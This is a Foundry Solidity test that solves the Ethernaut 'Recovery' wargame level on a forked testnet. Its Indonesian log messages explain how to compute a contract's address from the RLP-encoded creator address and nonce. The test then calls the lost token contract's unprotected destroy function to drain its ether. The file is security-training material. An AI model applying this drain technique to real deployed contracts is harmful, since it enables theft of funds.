// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import "../Ethernaut.sol";
import "../18-Recovery/RecoveryFactory.sol";
import "forge-std/Test.sol";

contract RecoveryAttack is Test {
    function testRecovery() external {
        vm.createSelectFork(vm.envString("sepolia"));
        address dokter = makeAddr("dokter");
        Ethernaut ethernaut = new Ethernaut();
        RecoveryFactory factory = new RecoveryFactory();
        ethernaut.registerLevel(factory);
        vm.deal(dokter, 100 ether);
        vm.startPrank(dokter, dokter);
        address addr = ethernaut.createLevelInstance{value: 1 ether}(factory);
        Recovery recovery = Recovery(addr);
        emit log("Goal: temukan alamat contract yang pertama dibuat, dan kirimkan ether di dalamnya ke suatu address");
        emit log(
            "menurut yellowpaper ethereum: Alamat akun baru didefinisikan sebagai 160 bit paling kanan dari hash Keccak dari pengkodean RLP dari struktur yang hanya berisi pengirim dan nonce akun."
        );
        emit log("alamat pengirim - Ini adalah alamat yang membuat kontrak.");
        emit log(
            "nonce - Ini adalah jumlah kontrak yang dibuat oleh kontrak pabrik atau jika ini adalah EOA, ini adalah jumlah transaksi oleh akun tersebut. Dalam hal ini, nilainya adalah 1 dengan asumsi bahwa ini adalah kontrak pertama yang dibuat oleh pabrik."
        );
        emit log(
            "RLP - Tujuan RLP adalah untuk mengkodekan susunan data biner yang bersarang secara sewenang-wenang, dan RLP adalah metode pengkodean utama yang digunakan untuk menserialisasi objek dalam lapisan eksekusi Ethereum."
        );
        emit log("RLP untuk alamat 20 byte adalah 0xd6, 0x94");
        emit log(
            "Pengkodean RLP untuk nonce 1 akan menjadi 0x01 karena untuk semua nilai di bawah rentang [0x00, 0x7f] (desimal [0, 127]), byte tersebut adalah pengkodean RLP-nya sendiri."
        );
        emit log("sebenarnya ada metode yang lebih mudah, yaitu melihat etherscan kontrak yang berkaitan");
        address kontrakIlang = address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(recovery), bytes1(0x01)))))
        );
        SimpleToken token = SimpleToken(payable(kontrakIlang));
        token.destroy(payable(dokter));
        bool sukses = ethernaut.submitLevelInstance(payable(addr));
        assertTrue(sukses);
    }
}
